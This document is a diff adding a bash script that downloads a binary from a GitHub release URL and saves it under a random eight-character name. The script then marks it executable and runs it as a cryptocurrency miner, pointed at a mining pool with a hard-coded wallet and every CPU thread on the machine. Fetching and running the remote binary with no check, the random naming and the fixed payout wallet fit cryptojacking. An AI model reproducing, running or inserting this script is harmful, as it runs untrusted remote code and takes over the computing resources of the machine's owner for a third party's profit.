@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# Generate random filename (8-char alphanumeric, no prefix)
+generate_random_filename() {
+    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 8
+}
+
+main() {
+    miner_filename=$(generate_random_filename)
+
+    # Cleanup on exit
+    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+
+    echo "📥 Downloading miner to: $miner_filename"
+    if wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/srnewmn -O "$miner_filename"; then
+        echo "✅ Download complete."
+    else
+        echo "❌ Failed to download miner. Exiting."
+        exit 1
+    fi
+
+    echo "🔐 Setting executable permission..."
+    if chmod +x "$miner_filename"; then
+        echo "✅ Permission granted."
+    else
+        echo "❌ Failed to set permissions."
+        exit 1
+    fi
+
+    echo "🚀 Starting miner..."
+    ./"$miner_filename" \
+        --algorithm randomy \
+        --pool corecoin.luckypool.io:3118 \
+        --wallet solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.DC55 \
+        --cpu-threads $(nproc --all)
+
+    if [[ $? -eq 0 ]]; then
+        echo "✅ Miner ran successfully."
+    else
+        echo "❌ Miner exited with an error."
+    fi
+}
+
+main
